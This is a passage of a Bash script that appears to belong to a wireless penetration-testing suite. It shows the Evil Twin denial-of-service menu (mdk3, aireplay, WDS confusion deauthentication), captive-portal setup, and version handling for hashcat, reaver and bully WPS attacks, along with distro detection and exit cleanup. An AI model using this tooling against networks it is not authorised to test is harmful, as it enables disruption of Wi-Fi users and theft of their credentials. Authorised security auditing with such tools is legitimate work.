		if [ "${yesno}" = "n" ]; then
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 151 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "y" ]; then
			et_handshake="${enteredpath}"
		else
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "n" ]; then
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ethandshake"
		done
	fi
}

#DoS Evil Twin attacks menu
function et_dos_menu() {

	debug_print

	if [ ${return_to_et_main_menu} -eq 1 ]; then
		return
	fi

	clear
	language_strings "${language}" 265 "title"
	current_menu="et_dos_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 139 mdk3_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings "${language}" 266
	print_hint ${current_menu}

	read -r et_dos_option
	case ${et_dos_option} in
		1)

			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Mdk3"
				if [ "${et_mode}" = "et_captive_portal" ]; then
					if [ ${internet_interface_selected} -eq 0 ]; then
						language_strings "${language}" 330 "blue"
						ask_yesno 326 "no"
						if [ "${yesno}" = "n" ]; then
							if check_et_without_internet_compatibility; then
								captive_portal_mode="dnsblackhole"
								internet_interface_selected=1
								echo
								language_strings "${language}" 329 "yellow"
								language_strings "${language}" 115 "read"
								et_prerequisites
							else
								echo
								language_strings "${language}" 327 "red"
								language_strings "${language}" 115 "read"
								return_to_et_main_menu=1
								return
							fi
						else
							if detect_internet_interface; then
								et_prerequisites
							else
								return
							fi
						fi
					else
						et_prerequisites
					fi
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		2)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Aireplay"
				if [ "${et_mode}" = "et_captive_portal" ]; then
					if [ ${internet_interface_selected} -eq 0 ]; then
						language_strings "${language}" 330 "blue"
						ask_yesno 326 "no"
						if [ "${yesno}" = "n" ]; then
							if check_et_without_internet_compatibility; then
								captive_portal_mode="dnsblackhole"
								internet_interface_selected=1
								echo
								language_strings "${language}" 329 "yellow"
								language_strings "${language}" 115 "read"
								et_prerequisites
							else
								echo
								language_strings "${language}" 327 "red"
								language_strings "${language}" 115 "read"
								return_to_et_main_menu=1
								return
							fi
						else
							if detect_internet_interface; then
								et_prerequisites
							else
								return
							fi
						fi
					else
						et_prerequisites
					fi
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		3)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Wds Confusion"
				if [ "${et_mode}" = "et_captive_portal" ]; then
					if [ ${internet_interface_selected} -eq 0 ]; then
						language_strings "${language}" 330 "blue"
						ask_yesno 326 "no"
						if [ "${yesno}" = "n" ]; then
							if check_et_without_internet_compatibility; then
								captive_portal_mode="dnsblackhole"
								internet_interface_selected=1
								echo
								language_strings "${language}" 329 "yellow"
								language_strings "${language}" 115 "read"
								et_prerequisites
							else
								echo
								language_strings "${language}" 327 "red"
								language_strings "${language}" 115 "read"
								return_to_et_main_menu=1
								return
							fi
						else
							if detect_internet_interface; then
								et_prerequisites
							else
								return
							fi
						fi
					else
						et_prerequisites
					fi
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		4)
			return_to_et_main_menu_from_beef=1
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	et_dos_menu
}

#Selected internet interface detection
function detect_internet_interface() {

	debug_print

	if [ ${internet_interface_selected} -eq 1 ]; then
		return 0
	fi

	if [ -n "${internet_interface}" ]; then
		echo
		language_strings "${language}" 285 "blue"
		ask_yesno 284 "yes"
		if [ "${yesno}" = "n" ]; then
			if ! select_internet_interface; then
				return 1
			fi
		fi
	else
		if ! select_internet_interface; then
			return 1
		fi
	fi

	validate_et_internet_interface
	return $?
}

#Show about and credits
function credits_option() {

	debug_print

	clear
	language_strings "${language}" 105 "title"
	language_strings "${language}" 74 "pink"
	echo
	language_strings "${language}" 73 "blue"
	echo
	echo -e "${green_color}                                                            .-\"\"\"\"-."
	sleep 0.15 && echo -e "                                                           /        \ "
	sleep 0.15 && echo -e "${yellow_color}         ____        ____  __   _______                  ${green_color} /_        _\ "
	sleep 0.15 && echo -e "${yellow_color}  ___  _/_   | _____/_   |/  |_ \   _  \_______         ${green_color} // \      / \\\\\ "
	sleep 0.15 && echo -e "${yellow_color}  \  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \        ${green_color} |\__\    /__/|"
	sleep 0.15 && echo -e "${yellow_color}   \   / |   |\___ \ |   ||  |  \  \_/   \  | \/         ${green_color} \    ||    /"
	sleep 0.15 && echo -e "${yellow_color}    \_/  |___/____  >|___||__|   \_____  /__|             ${green_color} \        /"
	sleep 0.15 && echo -e "${yellow_color}                  \/                   \/                  ${green_color} \  __  / "
	sleep 0.15 && echo -e "                                                             '.__.'"
	sleep 0.15 && echo -e "                                                              |  |${normal_color}"
	echo
	language_strings "${language}" 75 "blue"
	echo
	language_strings "${language}" 85 "pink"
	language_strings "${language}" 107 "pink"
	language_strings "${language}" 421 "pink"
	echo
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected language
function invalid_language_selected() {

	debug_print

	echo
	language_strings "${language}" 82 "red"
	echo
	language_strings "${language}" 115 "read"
}

#Show message for captive portal invalid selected language
function invalid_captive_portal_language_selected() {

	debug_print

	language_strings "${language}" 82 "red"
	echo
	language_strings "${language}" 115 "read"
	set_captive_portal_language
}

#Show message for forbidden selected option
function forbidden_menu_option() {

	debug_print

	echo
	language_strings "${language}" 220 "red"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected option
function invalid_menu_option() {

	debug_print

	echo
	language_strings "${language}" 76 "red"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected interface
function invalid_iface_selected() {

	debug_print

	echo
	language_strings "${language}" 77 "red"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_interface
}

#Show message for invalid selected internet interface
function invalid_internet_iface_selected() {

	debug_print

	echo
	language_strings "${language}" 77 "red"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_internet_interface
}

#Manage behavior of captured traps
function capture_traps() {

	debug_print

	if [ "${FUNCNAME[1]}" != "check_language_strings" ]; then
		case "${1}" in
			INT|SIGTSTP)
				case ${current_menu} in
					"pre_main_menu"|"select_interface_menu")
						exit_code=1
						exit_script_option
					;;
					*)
						ask_yesno 12 "yes"
						if [ "${yesno}" = "y" ]; then
							exit_code=1
							exit_script_option
						else
							language_strings "${language}" 224 "blue"
							if [ "${last_buffered_type1}" = "read" ]; then
								language_strings "${language}" "${last_buffered_message2}" "${last_buffered_type2}"
							else
								language_strings "${language}" "${last_buffered_message1}" "${last_buffered_type1}"
							fi
						fi
					;;
				esac
			;;
			SIGINT|SIGHUP)
				hardcore_exit
			;;
		esac
	else
		echo
		hardcore_exit
	fi
}

#Exit the script managing possible pending tasks
function exit_script_option() {

	debug_print

	action_on_exit_taken=0
	echo
	language_strings "${language}" 106 "title"
	language_strings "${language}" 11 "blue"

	echo
	language_strings "${language}" 165 "blue"

	if [ "${ifacemode}" = "Monitor" ]; then
		ask_yesno 166 "no"
		if [ "${yesno}" = "n" ]; then
			action_on_exit_taken=1
			language_strings "${language}" 167 "multiline"
			${airmon} stop "${interface}" > /dev/null 2>&1
			ifacemode="Managed"
			time_loop
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	fi

	if [ ${nm_processes_killed} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 168 "multiline"
		eval "${networkmanager_cmd} > /dev/null 2>&1"
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 164 "multiline"
		clean_tmpfiles
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${routing_modified} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 297 "multiline"
		clean_routing_rules
		killall dhcpd > /dev/null 2>&1
		killall hostapd > /dev/null 2>&1
		killall lighttpd > /dev/null 2>&1
		kill_beef
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [[ ${spoofed_mac} -eq 1 ]] && [[ "${ifacemode}" = "Managed" ]]; then
		language_strings "${language}" 418 "multiline"
		restore_spoofed_macs
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ ${action_on_exit_taken} -eq 0 ]; then
		language_strings "${language}" 160 "yellow"
	fi

	echo
	exit ${exit_code}
}

#Exit the script managing possible pending tasks but not showing anything
function hardcore_exit() {

	debug_print

	exit_code=2
	if [ "${ifacemode}" = "Monitor" ]; then
		${airmon} stop "${interface}" > /dev/null 2>&1
		ifacemode="Managed"
	fi

	if [ ${nm_processes_killed} -eq 1 ]; then
		eval "${networkmanager_cmd} > /dev/null 2>&1"
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		clean_tmpfiles
	fi

	if [ ${routing_modified} -eq 1 ]; then
		clean_routing_rules
		killall dhcpd > /dev/null 2>&1
		killall hostapd > /dev/null 2>&1
		killall lighttpd > /dev/null 2>&1
		kill_beef
	fi

	if [[ ${spoofed_mac} -eq 1 ]] && [[ "${ifacemode}" = "Managed" ]]; then
		language_strings "${language}" 418 "multiline"
		restore_spoofed_macs
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	exit ${exit_code}
}

#Generate a small time loop printing some dots
function time_loop() {

	debug_print

	echo -ne " "
	for (( j=1; j<=4; j++ )); do
		echo -ne "."
		sleep 0.035
	done
}

#Determine which version of airmon to use
function airmon_fix() {

	debug_print

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

#Prepare the fix for iwconfig command depending of the wireless tools version
function iwconfig_fix() {

	debug_print

	iwversion=$(iwconfig --version 2> /dev/null | grep version | awk '{print $4}')
	iwcmdfix=""
	if [ "${iwversion}" -lt 30 ]; then
		iwcmdfix=" 2> /dev/null | grep Mode: "
	fi
}

#Set hashcat parameters based on version
function set_hashcat_parameters() {

	debug_print

	hashcat_fix=""
	hashcat_charset_fix_needed=0
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then
		hashcat_fix=" --weak-hash-threshold 0 -D 1 --force"
		hashcat_charset_fix_needed=1
		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
			hccapx_needed=1
		fi
	fi
}

#Determine hashcat version
function get_hashcat_version() {

	debug_print

	hashcat_version=$(hashcat -V 2> /dev/null)
	hashcat_version=${hashcat_version#"v"}
}

#Determine bettercap version
function get_bettercap_version() {

	debug_print

	bettercap_version=$(bettercap -v 2> /dev/null | grep -E "^bettercap [0-9]" | awk '{print $2}')
}

#Determine bully version
function get_bully_version() {

	debug_print

	bully_version=$(bully -V 2> /dev/null)
	bully_version=${bully_version#"v"}
}

#Determine reaver version
function get_reaver_version() {

	debug_print

	reaver_version=$(reaver -h 2>&1 > /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}')
	if [ -z "${reaver_version}" ]; then
		reaver_version=$(reaver -h 2> /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}')
	fi
	reaver_version=${reaver_version#"v"}
}

#Set verbosity for bully based on version
function set_bully_verbosity() {

	debug_print

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_verbosity4_version}"; then
		bully_verbosity="4"
	else
		bully_verbosity="3"
	fi
}

#Validate if bully version is able to perform integrated pixiewps attack
function validate_bully_pixiewps_version() {

	debug_print

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Validate if reaver version is able to perform integrated pixiewps attack
function validate_reaver_pixiewps_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Set the script folder var if necessary
function set_script_folder_and_name() {

	debug_print

	if [ -z "${scriptfolder}" ]; then
		scriptfolder=${0}

		if ! [[ ${0} =~ ^/.*$ ]]; then
			if ! [[ ${0} =~ ^.*/.*$ ]]; then
				scriptfolder="./"
			fi
		fi
		scriptfolder="${scriptfolder%/*}/"
		scriptname="${0##*/}"
	fi
}

#Set the default directory for saving files
function set_default_save_path() {

	debug_print

	if [ "${is_docker}" -eq 1 ]; then
		default_save_path="${docker_io_dir}"
	else
		default_save_path=$(env | grep ^HOME | awk -F = '{print $2}')
	fi
}

#Check if pins database file exist and try to download the new one if proceed
function check_pins_database_file() {

	debug_print

	if [ -f "${scriptfolder}${known_pins_dbfile}" ]; then
		language_strings "${language}" 376 "yellow"
		echo
		language_strings "${language}" 287 "blue"
		if check_repository_access; then
			get_local_pin_dbfile_checksum "${scriptfolder}${known_pins_dbfile}"
			if ! get_remote_pin_dbfile_checksum; then
				echo
				language_strings "${language}" 381 "yellow"
			else
				echo
				if [ "${local_pin_dbfile_checksum}" != "${remote_pin_dbfile_checksum}" ]; then
					language_strings "${language}" 383 "yellow"
					echo
					if download_pins_database_file; then
						language_strings "${language}" 377 "yellow"
						pin_dbfile_checked=1
					else
						language_strings "${language}" 378 "yellow"
					fi
				else
					language_strings "${language}" 382 "yellow"
					pin_dbfile_checked=1
				fi
			fi
		else
			echo
			language_strings "${language}" 375 "yellow"
			ask_for_pin_dbfile_download_retry
		fi
		return 0
	else
		language_strings "${language}" 374 "yellow"
		echo
		if hash curl 2> /dev/null; then
			language_strings "${language}" 287 "blue"
			if ! check_repository_access; then
				echo
				language_strings "${language}" 375 "yellow"
				return 1
			else
				echo
				if download_pins_database_file; then
					language_strings "${language}" 377 "yellow"
					pin_dbfile_checked=1
					return 0
				else
					language_strings "${language}" 378 "yellow"
					return 1
				fi
			fi
		else
			language_strings "${language}" 414 "yellow"
			return 1
		fi
	fi
}

#Download the pins database file
function download_pins_database_file() {

	debug_print

	local pindb_file_downloaded=0
	remote_pindb_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile} 2> /dev/null)

	if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
		pindb_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pindb_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile} 2> /dev/null)
			if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
				pindb_file_downloaded=1
			fi
		fi
	fi

	if [ "${pindb_file_downloaded}" -eq 1 ]; then
		echo "${remote_pindb_file}" > "${scriptfolder}${known_pins_dbfile}"
		return 0
	else
		return 1
	fi
}

#Ask for try to download pin db file again and set the var to skip it
function ask_for_pin_dbfile_download_retry() {

	debug_print

	ask_yesno 380 "no"
	if [ "${yesno}" = "n" ]; then
		pin_dbfile_checked=1
	fi
}

#Get the checksum for local pin database file
function get_local_pin_dbfile_checksum() {

	debug_print

	local_pin_dbfile_checksum=$(md5sum "${1}" | awk '{print $1}')
}

#Get the checksum for remote pin database file
function get_remote_pin_dbfile_checksum() {

	debug_print

	remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)

	if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
		return 0
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)
			if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
				return 0
			fi
		fi
	fi
	return 1
}

#Check for possible non Linux operating systems
function non_linux_os_check() {

	debug_print

	case "${OSTYPE}" in
		solaris*)
			distro="Solaris"
		;;
		darwin*)
			distro="Mac OSX"
		;;
		bsd*)
			distro="FreeBSD"
		;;
	esac
}

#First phase of Linux distro detection based on uname output
function detect_distro_phase1() {

	debug_print

	for i in "${known_compatible_distros[@]}"; do
		if uname -a | grep "${i}" -i > /dev/null; then
			distro="${i^}"
			break
		fi
	done
}

#Second phase of Linux distro detection based on architecture and version file
function detect_distro_phase2() {

	debug_print

	if [ "${distro}" = "Unknown Linux" ]; then
		if [ -f ${osversionfile_dir}"centos-release" ]; then
			distro="CentOS"
		elif [ -f ${osversionfile_dir}"fedora-release" ]; then
			distro="Fedora"
		elif [ -f ${osversionfile_dir}"gentoo-release" ]; then
			distro="Gentoo"
		elif [ -f ${osversionfile_dir}"openmandriva-release" ]; then
			distro="OpenMandriva"
		elif [ -f ${osversionfile_dir}"redhat-release" ]; then
			distro="Red Hat"
		elif [ -f ${osversionfile_dir}"SuSE-release" ]; then
			distro="SuSE"
		elif [ -f ${osversionfile_dir}"debian_version" ]; then
			distro="Debian"
			if [ -f ${osversionfile_dir}"os-release" ]; then
				extra_os_info=$(grep "PRETTY_NAME" < ${osversionfile_dir}"os-release")
				if [[ "${extra_os_info}" =~ Raspbian ]]; then
					distro="Raspbian"
					is_arm=1
				elif [[ "${extra_os_info}" =~ Parrot ]]; then
					distro="Parrot arm"
					is_arm=1
				fi
			fi
		fi
	elif [ "${distro}" = "Arch" ]; then
		if [ -f ${osversionfile_dir}"os-release" ]; then
			extra_os_info=$(grep "PRETTY_NAME" < ${osversionfile_dir}"os-release")
			if [[ "${extra_os_info}" =~ BlackArch ]]; then
				distro="BlackArch"
			elif [[ "${extra_os_info}" =~ Kali ]]; then
				#Kali is intentionally here too to avoid some Kali arm distro bad detection
				distro="Kali"
				is_arm=1
			fi
		fi
	fi

	detect_arm_architecture
}

#Detect if arm architecture is present on system
function detect_arm_architecture() {

	debug_print

	distro_already_known=0

	if uname -m | grep -i "arm" > /dev/null && "${distro}" != "Unknown Linux"; then

		for item in "${known_arm_compatible_distros[@]}"; do
			if [ "${distro}" = "${item}" ]; then
				distro_already_known=1
			fi
		done

		if [ ${distro_already_known} -eq 0 ]; then
			distro="${distro} arm"
			is_arm=1
		fi
	elif [[ "${distro}" != "Unknown Linux" ]] && [[ "${is_arm}" -eq 1 ]]; then
		distro="${distro} arm"
	fi
}

#Set some useful vars based on Linux distro
function special_distro_features() {

	debug_print

	case ${distro} in
		"Wifislax")
			networkmanager_cmd="service restart networkmanager"
			xratio=7
			yratio=15.1
			ywindow_edge_lines=1
			ywindow_edge_pixels=-14
		;;
		"Backbox")
			networkmanager_cmd="service network-manager restart"
			xratio=6
			yratio=14.2
			ywindow_edge_lines=1
			ywindow_edge_pixels=15
		;;
		"Ubuntu")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Kali"|"Kali arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Debian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=14
		;;
		"SuSE")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"CentOS")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Parrot"|"Parrot arm")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Arch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Fedora")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6
			yratio=14.1
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Gentoo")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Red Hat")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=15.3
			ywindow_edge_lines=1
			ywindow_edge_pixels=10
		;;
		"Cyborg")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14.5
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"BlackArch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=7.3
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=1
		;;
		"Raspbian")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=20
		;;
		"OpenMandriva")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=2
			ywindow_edge_pixels=-10
		;;
	esac
}

#Determine if NetworkManager must be killed on your system. Only needed for previous versions of 1.0.12
function check_if_kill_needed() {

	debug_print

	nm_min_main_version="1"
	nm_min_subversion="0"
	nm_min_subversion2="12"

	if ! hash NetworkManager 2> /dev/null; then
		check_kill_needed=0
	else
		nm_system_version=$(NetworkManager --version 2> /dev/null)

		if [ "${nm_system_version}" != "" ]; then

			[[ ${nm_system_version} =~ ^([0-9]{1,2})\.([0-9]{1,2})\.?(([0-9]+)|.+)? ]] && nm_main_system_version="${BASH_REMATCH[1]}" && nm_system_subversion="${BASH_REMATCH[2]}" && nm_system_subversion2="${BASH_REMATCH[3]}"

			[[ ${nm_system_subversion2} =~ [a-zA-Z] ]] && nm_system_subversion2="0"

			if [ "${nm_main_system_version}" -lt ${nm_min_main_version} ]; then
				check_kill_needed=1
			elif [ "${nm_main_system_version}" -eq ${nm_min_main_version} ]; then

				if [ "${nm_system_subversion}" -lt ${nm_min_subversion} ]; then
					check_kill_needed=1
				elif [ "${nm_system_subversion}" -eq ${nm_min_subversion} ]; then

					if [ "${nm_system_subversion2}" -lt ${nm_min_subversion2} ]; then
						check_kill_needed=1
					fi
				fi
			fi
		else
			check_kill_needed=1
		fi
	fi
}

#Do some checks for some general configuration
function general_checkings() {

	debug_print

	compatible=0
	distro="Unknown Linux"

	detect_distro_phase1
	detect_distro_phase2
	special_distro_features
	check_if_kill_needed

	if [ "${distro}" = "Unknown Linux" ]; then
		non_linux_os_check
		echo -e "${yellow_color}${distro}${normal_color}"
	else
		if [ "${is_docker}" -eq 1 ]; then
			echo -e "${yellow_color}${docker_based_distro} Linux ${pink_color}(Docker)${normal_color}"
		else
			echo -e "${yellow_color}${distro} Linux${normal_color}"
		fi
	fi

	check_compatibility
	if [ ${compatible} -eq 1 ]; then
		return
	fi

	language_strings "${language}" 115 "read"
	exit_code=1
	exit_script_option
}

#Check if the user is root
function check_root_permissions() {

	debug_print

	user=$(whoami)

	if [ "${user}" = "root" ]; then
		language_strings "${language}" 484 "yellow"
	else
		language_strings "${language}" 223 "red"
		exit_code=1
		exit_script_option
	fi
}

#Print Linux known distros
function print_known_distros() {

	debug_print

	all_known_compatible_distros=("${known_compatible_distros[@]}" "${known_arm_compatible_distros[@]}")
	IFS=$'\n'
	all_known_compatible_distros=($(printf "%s\n" "${all_known_compatible_distros[@]}" | sort))
	unset IFS

	for i in "${all_known_compatible_distros[@]}"; do
		echo -ne "${pink_color}\"${i}\" ${normal_color}"
	done
	echo
}

#Check if you have installed the tools (essential and optional) that the script uses
function check_compatibility() {

	debug_print

	echo
	language_strings "${language}" 108 "blue"
	language_strings "${language}" 115 "read"

	echo
	language_strings "${language}" 109 "blue"

	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		echo -ne "${i}"
		time_loop
		if ! hash "${i}" 2> /dev/null; then
			echo -ne "${red_color} Error${normal_color}"
			essential_toolsok=0
			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
			echo -e "\r"
		else
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	done

	echo
	language_strings "${language}" 218 "blue"

	optional_toolsok=1
	for i in "${!optional_tools[@]}"; do
		echo -ne "${i}"
		time_loop
		if ! hash "${i}" 2> /dev/null; then
			echo -ne "${red_color} Error${normal_color}"
			optional_toolsok=0
			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
			echo -e "\r"
		else
			if [ "${i}" = "beef" ]; then
				detect_fake_beef
				if [ ${fake_beef_found} -eq 1 ]; then
					echo -ne "${red_color} Error${normal_color}"
					optional_toolsok=0
					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
					echo -e "\r"
				else
					echo -e "${green_color} Ok\r${normal_color}"
					optional_tools[${i}]=1
				fi
			else
				echo -e "${green_color} Ok\r${normal_color}"
				optional_tools[${i}]=1
			fi
		fi
	done

	update_toolsok=1
	if [ "${auto_update}" -eq 1 ]; then

		echo
		language_strings "${language}" 226 "blue"

		for i in "${update_tools[@]}"; do
			echo -ne "${i}"
			time_loop
			if ! hash "${i}" 2> /dev/null; then
				echo -ne "${red_color} Error${normal_color}"
				update_toolsok=0
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			else
				echo -e "${green_color} Ok\r${normal_color}"
			fi
		done
	fi

	if [ ${essential_toolsok} -eq 0 ]; then
		echo
		language_strings "${language}" 111 "red"
		echo
		return
	fi

	compatible=1

	if [ ${optional_toolsok} -eq 0 ]; then
		echo
		language_strings "${language}" 219 "yellow"
		echo
		if [ ${fake_beef_found} -eq 1 ]; then
			language_strings "${language}" 401 "red"
			echo
		fi
		return
	fi

	echo
	language_strings "${language}" 110 "yellow"
}

#Check for the minimum bash version requirement
function check_bash_version() {

	debug_print

	echo
	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
	if compare_floats_greater_or_equal "${bashversion}" ${minimum_bash_version_required}; then
		language_strings "${language}" 221 "yellow"
	else
		language_strings "${language}" 222 "red"
		exit_code=1
		exit_script_option
	fi
}

#Check if you have installed the tools required to update the script
function check_update_tools() {

	debug_print

	if [ "${auto_update}" -eq 1 ]; then
		if [ ${update_toolsok} -eq 1 ]; then
			autoupdate_check
		else
			echo
			language_strings "${language}" 225 "yellow"
			language_strings "${language}" 115 "read"
		fi
	else
		if [ "${is_docker}" -eq 1 ]; then
			echo
			language_strings "${language}" 422 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if window size is enough for intro
function check_window_size_for_intro() {

	debug_print

	window_width=$(tput cols)
	window_height=$(tput lines)

	if [ "${window_width}" -lt 69 ]; then
		return 1
	elif [[ ${window_width} -ge 69 ]] && [[ ${window_width} -le 80 ]]; then
		if [ "${window_height}" -lt 20 ]; then
			return 1
		fi
	else
		if [ "${window_height}" -lt 19 ]; then
			return 1
		fi
	fi

	return 0
}

#Print the script intro
function print_intro() {

	debug_print

	echo -e "${yellow_color}                  .__                         .___  .___"
	sleep 0.15 && echo -e "           _____  |__|______  ____   ____   __| _/__| _/____   ____"
	sleep 0.15 && echo -e "           \__  \ |  \_  __ \/ ___\_/ __ \ / __ |/ __ |/  _ \ /    \\"
	sleep 0.15 && echo -e "            / __ \|  ||  | \/ /_/  >  ___// /_/ / /_/ (  <_> )   |  \\"
	sleep 0.15 && echo -e "           (____  /__||__|  \___  / \___  >____ \____ |\____/|___|  /"
	sleep 0.15 && echo -e "                \/         /_____/      \/     \/    \/           \/${normal_color}"
	echo
	language_strings "${language}" 228 "green"
	print_animated_flying_saucer
	sleep 1
}

#Generate the frames of the animated ascii art flying saucer
function flying_saucer() {

	debug_print

	case ${1} in
		1)
			echo "                                                             "
			echo "                         .   *       _.---._  *              "
			echo "                                   .'       '.       .       "
			echo "                               _.-~===========~-._          *"
			echo "                           *  (___________________)     .    "
			echo "                       .     .      \_______/    *           "
		;;
		2)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
		3)
			echo "                                   *                .        "
			echo "                             *       _.---._              *  "
			echo "                          .        .'       '.       *       "
			echo "                       .       _.-~===========~-._     *     "
			echo "                              (___________________)         ."
			echo "                       *            \_______/ .              "
		;;
		4)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
	esac
	sleep 0.4
}

#Print animated ascii art flying saucer
function print_animated_flying_saucer() {

	debug_print

	echo -e "\033[s"

	for i in $(seq 1 8); do
		if [ "${i}" -le 4 ]; then
			saucer_frame=${i}
		else
			saucer_frame=$((i-4))
		fi
		echo -e "\033[u"
		flying_saucer ${saucer_frame}
	done
}

#Initialize script settings
function initialize_script_settings() {

	debug_print

	is_docker=0
	exit_code=0
	check_kill_needed=0
	nm_processes_killed=0
	airmon_fix
	autochanged_language=0
	tmpfiles_toclean=0
	routing_modified=0
	iptables_saved=0
	spoofed_mac=0
